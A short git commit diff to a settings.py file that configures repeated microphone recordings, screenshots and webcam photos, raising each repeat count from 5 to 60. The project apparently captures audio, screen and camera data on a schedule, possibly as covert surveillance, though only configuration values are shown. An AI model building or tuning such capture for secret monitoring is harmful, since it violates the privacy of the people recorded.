9f734351ff417a342411ef20e71d33169c4fe36b
hgouchi <dimplingprego@proton.me>
2023-06-09 18:34:03 +0200

    update settings.py

--- settings.py
+++ settings.py
@@ -8,13 +8,13 @@ path = user + '/' + name_dir + '/'
 
 # microphone
 microphone_time = 10
-microphone_repeat = 5
+microphone_repeat = 60
 
 # screen
-screenshots_repeat = 5
+screenshots_repeat = 60
 
 # web camera
-photo_repeat = 5
+photo_repeat = 60
 photo_width = 1080
 photo_height = 1920
 camera_index = 0
